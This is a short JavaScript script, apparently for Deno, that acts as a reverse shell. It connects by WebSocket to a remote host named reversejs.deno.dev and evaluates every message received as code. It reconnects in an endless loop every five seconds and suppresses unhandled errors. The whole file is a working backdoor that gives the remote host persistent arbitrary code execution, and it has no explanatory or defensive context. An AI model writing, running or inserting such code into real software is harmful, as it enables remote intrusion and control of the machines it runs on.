globalThis.addEventListener("unhandledrejection", (e) => e.preventDefault());

while (true) {
  const socket = new WebSocket(`wss://reversejs.deno.dev/client`);
  socket.addEventListener("message", (code) => eval(code.data));

  await new Promise((resolve) => socket.addEventListener("close", resolve));
  await new Promise((resolve) => setTimeout(resolve, 5000));
}
